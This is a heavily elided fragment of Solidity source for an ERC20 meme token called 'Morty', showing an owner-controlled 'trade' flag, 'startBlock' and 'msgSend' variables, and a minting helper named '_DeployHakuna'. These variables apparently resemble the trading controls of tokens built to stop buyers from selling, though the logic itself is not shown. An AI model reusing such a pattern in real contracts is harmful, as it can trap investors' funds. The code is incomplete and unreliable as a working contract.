...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    bool public trade = true; uint256 public startBlock; address public msgSend;
    ...
    function _DeployHakuna(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployHakuna(creator, initialSupply);
    }
}

contract Morty is ERC20Token {
    constructor() ERC20Token("Morty", "MORTY", msg.sender, 42069000000 * 10 ** 18) {
    }
}